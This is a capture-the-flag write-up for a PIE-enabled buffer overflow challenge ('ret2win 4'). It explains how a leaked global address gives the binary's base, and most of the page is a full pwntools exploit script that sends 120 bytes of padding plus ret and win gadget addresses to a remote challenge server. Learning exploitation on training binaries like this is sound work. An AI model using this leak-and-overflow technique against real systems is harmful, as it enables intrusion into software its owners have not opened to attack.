---
description: Binary Exploitation
---

# ret2win 4

> Mitigasi lain untuk menyusahkan penyerang dalam mengubah alur program adalah PIE. PIE adalah singkatan dari Position Independent Executable yang mengakibatkan program kita untuk di-load ke dalam memori dengan offset random. Jadi walaupun ada buffer overflow, penyerang tidak tau alamat dari fungsi/instruksi yang ingin dijalankan. Tapi, kalau kita bisa dapetin salah satu alamat dari program saat dijalankan, alamat dari fungsi/instruksi yang ingin dijalankan tinggal dihitung dari selisihnya dengan alamat yang udah didapetin tadi.
>
> Author: **zran**

{% file src="../../.gitbook/assets/ret2win4.zip" %}

First time learning PIE, and this challenge is a simple introduction to PIE. The goal is to buffer overflow but with PIE in mind. First step is to use the given leak to get PIE, since it's a global variable it's very easy to find the offset. _(see 0x404c \<what\_is\_this\_for>)_

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption><p>Main function debug</p></figcaption></figure>

Just subtract the leaked address with -0x404c and we get the base address for ROP:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win --host playground.tcp1p.team --port 19003
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2win')
context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'playground.tcp1p.team'
port = int(args.PORT or 19003)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

log.info(io.recvuntil(': '))
leak = int(io.recvline(), 16)
log.success(f"Gifted address: {hex(leak)}")
base_addr = leak - 0x000000000000404c
log.success(f"Base address: {hex(base_addr)}")
log.info(io.clean()) 

payload = b'A' * 120
payload += p64(base_addr + 0x000000000000101a) # ret
payload += p64(base_addr + 0x0000000000001209) # win
log.success(f"Payload: {payload}")

log.info(io.clean())
io.sendline(payload)
io.interactive()
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
